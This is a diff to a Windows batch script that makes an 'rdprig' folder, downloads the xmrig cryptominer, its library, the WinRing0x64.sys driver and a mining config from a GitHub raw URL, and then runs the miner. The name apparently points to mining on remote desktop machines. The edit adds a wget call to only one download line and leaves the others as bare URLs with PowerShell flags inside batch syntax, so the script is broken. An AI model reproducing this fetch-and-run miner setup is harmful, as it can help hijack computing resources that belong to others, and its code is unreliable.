@@ -6,13 +6,13 @@ if %ERRORLEVEL% equ 0 (
   echo processing...
   mkdir rdprig
   cd rdprig
-  https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig.exe
-  https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig-asm.lib
-  https://raw.githubusercontent.com/Sueqkjs/rdprig/master/WinRing0x64.sys
+  wget https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig.exe -UseBasicParsing -OutFile xmrig.exe
+  https://raw.githubusercontent.com/Sueqkjs/rdprig/master/xmrig-asm.lib -UseBasicParsing -OutFile xmrig-asm.lib
+  https://raw.githubusercontent.com/Sueqkjs/rdprig/master/WinRing0x64.sys -UseBasicParsing -OutFile WinRing0x64.sys
   
   :: Change this!
   :: https://raw.githubusercontent.com/[Your GitHub username]/rdprig/master/config.json
-  https://raw.githubusercontent.com/Sueqkjs/rdprig/master/config.json
+  https://raw.githubusercontent.com/Sueqkjs/rdprig/master/config.json -UseBasicParsing -OutFile config.json
   
   xmrig.exe
 ) else (
